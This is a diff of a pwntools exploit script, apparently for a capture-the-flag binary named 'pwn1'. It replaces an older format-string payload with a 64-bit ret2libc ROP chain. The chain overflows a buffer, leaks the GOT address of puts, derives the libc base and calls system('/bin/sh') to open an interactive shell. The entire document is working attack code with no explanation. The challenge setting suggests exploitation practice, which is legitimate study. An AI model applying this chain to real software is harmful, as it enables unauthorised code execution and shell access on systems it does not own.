@@ -4,9 +4,9 @@
 
 from pwn import *
 
-local_file  = './pwn4'
+local_file  = './pwn1'
 local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
-remote_libc = local_libc # '../libc.so.6'
+remote_libc = './libc.so'
 
 is_local = False
 is_remote = False
@@ -27,7 +27,7 @@ elif len(sys.argv) > 1:
 
 elf = ELF(local_file)
 
-# context.log_level = 'debug'
+context.log_level = 'debug'
 context.arch = elf.arch
 
 se      = lambda data               :p.send(data) 
@@ -46,26 +46,31 @@ def debug(cmd=''):
 
 # info
 # gadget
+prdi = 0x0000000000400783 # pop rdi ; ret
+ret = 0x0000000000400536 # ret
+
 # elf, libc
-sh = 0x08048C81
-ret = 0x8048c53
-got = 0x80f2f74
+main = 0x00400698
 
 # rop1
-fmt = "%*25$d%16$n"
-sla('user: ',fmt)
-#debug('b *0x08048a63')
-sla('code: ','2333')
+offset = cyclic_find(0x61616173)
+payload = cyclic(offset)
+payload += p64(prdi) + p64(elf.got['puts']) + p64(elf.sym['puts']) + p64(main)
 
-#i=0
-#while 1:
-#    l=len(p.recv(timeout=1))
-#    if not l: break
-#    i+=l
-#    #print i/1024/1024
-#    if i/1024/1024>50:
-#        log.warning("try again")
-#        exit(0)
-p.clean(10)
+ru('buffer: ')
+# debug()
+sl(payload)
+puts = uu64(rc(6))
+info_addr("puts",puts)
+libcbase = puts-libc.sym['puts']
+system = libcbase+libc.sym['system']
+binsh  = libcbase+libc.search('/bin/sh').next()
+ru('buffer: ')
+
+payload = cyclic(offset)
+payload += p64(ret) + p64(prdi) + p64(binsh) + p64(system) + p64(main)
+# debug()
+sl(payload)
 
 p.interactive()
+
